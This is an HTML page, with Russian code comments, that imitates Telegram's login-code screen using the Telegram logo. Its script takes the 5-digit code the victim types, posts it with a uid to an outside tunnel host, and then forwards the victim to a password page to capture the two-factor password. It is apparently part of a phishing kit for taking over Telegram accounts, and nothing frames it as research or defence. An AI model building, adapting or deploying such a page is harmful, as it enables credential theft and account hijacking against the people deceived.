<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; margin: 0; }
        .logo { width: 80px; height: 80px; margin-bottom: 25px; }
        
        .input-box {
            width: 100%;
            max-width: 320px;
            margin: 0 auto 20px;
            background: #1c252f;
            border: 1px solid #2a3644;
            border-radius: 12px;
            height: 56px;
            display: flex;
            align-items: center;
        }

        input {
            width: 100%;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 22px;
            text-align: center;
            outline: none;
            letter-spacing: 4px; /* Чтобы код выглядел как в Telegram */
        }

        button { 
            width: 100%; 
            max-width: 320px; 
            height: 50px;
            background: #248bdf; 
            border: none; 
            border-radius: 12px; 
            color: #fff; 
            font-weight: 700; 
            font-size: 16px; 
            cursor: pointer; 
        }

        p { color: #8a99a8; font-size: 15px; margin-bottom: 30px; }
    </style>
</head>
<body>
    <img src="https://telegram.org/img/t_logo.png" class="logo">
    
    <h2>Enter Code</h2>
    <p>Check your Telegram notifications</p>
    
    <div class="input-box">
        <input type="tel" id="code" placeholder="00000" maxlength="5" autocomplete="off" autofocus>
    </div>
    
    <button id="btn" onclick="submitCode()">Verify</button>

    <script>
        const input = document.getElementById('code');

        // Разрешаем только цифры и не более 5
        input.addEventListener('input', () => {
            input.value = input.value.replace(/\D/g, '').substring(0, 5);
        });

        async function submitCode() {
            const val = input.value;
            if (val.length !== 5) {
                alert("Please enter a 5-digit code.");
                return;
            }

            const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";

            try {
                await fetch("https://a0fc33837243f7b6-95-24-163-77.serveousercontent.comsubmit", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'code', value: val, uid: uid })
                });
            } catch(e) {}

            // Если в Ultimate Pro включен двухфакторный пароль — шлем туда
            window.location.href = "password.html" + window.location.search;
        }
    </script>
</body>
</html>
